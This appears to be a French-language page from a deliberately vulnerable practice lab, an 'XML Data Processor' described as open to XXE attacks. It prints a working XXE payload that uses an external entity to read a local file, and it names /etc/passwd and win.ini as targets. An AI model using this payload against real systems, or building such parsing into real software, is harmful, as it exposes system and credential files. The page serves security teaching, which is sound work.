XML Data Processor (XXE Vulnerable)

Soumettez du contenu XML pour traitement. Cette fonctionnalité est vulnérable aux attaques XXE.


Résultat du Traitement :

Exemple de Payload XXE (pour lire /etc/passwd sur Linux ou C:\Windows\win.ini sur Windows) :

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///C:/temp/xxe_test.txt" >
]>
<foo><content>&xxe;</content></foo>

Soumettez ce XML pour potentiellement voir le contenu du fichier dans le résultat.
